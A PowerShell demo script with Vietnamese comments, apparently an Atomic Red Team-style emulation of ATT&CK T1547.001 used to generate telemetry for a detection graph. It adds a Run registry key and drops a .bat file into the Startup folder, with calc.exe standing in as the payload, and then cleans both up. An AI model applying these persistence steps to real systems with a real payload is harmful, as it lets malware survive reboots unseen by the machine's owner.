

<#
.SYNOPSIS
    Demo T1547.001 - Registry Run Keys & Startup Folder
    Mục tiêu: Tạo đồ thị Process -> Registry và Process -> File
#>

Write-Host "=========================================================" -ForegroundColor Cyan
Write-Host "    MULTIKG DEMO - T1547.001 (Persistence)               " -ForegroundColor Cyan
Write-Host "=========================================================" -ForegroundColor Cyan
Start-Sleep -Seconds 1

# --- CẤU HÌNH ---
$MalwarePath = "C:\Windows\System32\calc.exe" # Giả vờ calc là malware
$RegKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$RegValueName = "AtomicRedTeam_Malware"
$StartupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$StartupFile = "$StartupFolder\MaliciousLoader.bat"

# ---------------------------------------------------------
# PHASE 1: Registry Run Key Persistence
# ---------------------------------------------------------
Write-Host "`n[1/3] Executing Registry Persistence..." -ForegroundColor Yellow
Write-Host "    -> Adding '$RegValueName' to Run Key." -ForegroundColor Gray

# Sử dụng Reg.exe để tạo log Process Create (Event 1) rõ ràng
# Lệnh này sẽ khớp với node "reg.exe" trong đồ thị
$RegCommand = "reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v $RegValueName /t REG_SZ /d `"$MalwarePath`" /f"
Invoke-Expression $RegCommand

if (Get-ItemProperty -Path $RegKeyPath -Name $RegValueName -ErrorAction SilentlyContinue) {
    Write-Host "    [+] Registry Key added successfully!" -ForegroundColor Green
} else {
    Write-Host "    [-] Failed to add Registry Key." -ForegroundColor Red
}

Start-Sleep -Seconds 2

# ---------------------------------------------------------
# PHASE 2: Startup Folder Persistence
# ---------------------------------------------------------
Write-Host "`n[2/3] Executing Startup Folder Persistence..." -ForegroundColor Yellow
Write-Host "    -> Dropping payload to: $StartupFile" -ForegroundColor Gray

$PayloadContent = @"
@echo off
echo [+] I AM PERSISTENT MALWARE!
start calc.exe
"@

try {
    # Tạo file .bat trong Startup
    $PayloadContent | Out-File -FilePath $StartupFile -Encoding ASCII -Force
    Write-Host "    [+] Startup file dropped successfully!" -ForegroundColor Green
} catch {
    Write-Host "    [-] Failed to drop startup file." -ForegroundColor Red
}

Start-Sleep -Seconds 2

# ---------------------------------------------------------
# PHASE 3: Verification & Cleanup Message
# ---------------------------------------------------------
Write-Host "`n[3/3] Attack Completed." -ForegroundColor Magenta
Write-Host "---------------------------------------------------------" 
Write-Host "EVIDENCE FOR DEMO:" -ForegroundColor Cyan
Write-Host "1. Open Registry Editor -> HKCU...Run -> Check for '$RegValueName'"
Write-Host "2. Open Folder: $StartupFolder"
Write-Host "---------------------------------------------------------" 
Write-Host "Press ENTER to cleanup and finish..." -ForegroundColor Yellow
Read-Host

# Cleanup
Remove-ItemProperty -Path $RegKeyPath -Name $RegValueName -ErrorAction SilentlyContinue
if (Test-Path $StartupFile) { Remove-Item $StartupFile -Force }
Write-Host "[+] Cleanup Done." -ForegroundColor Green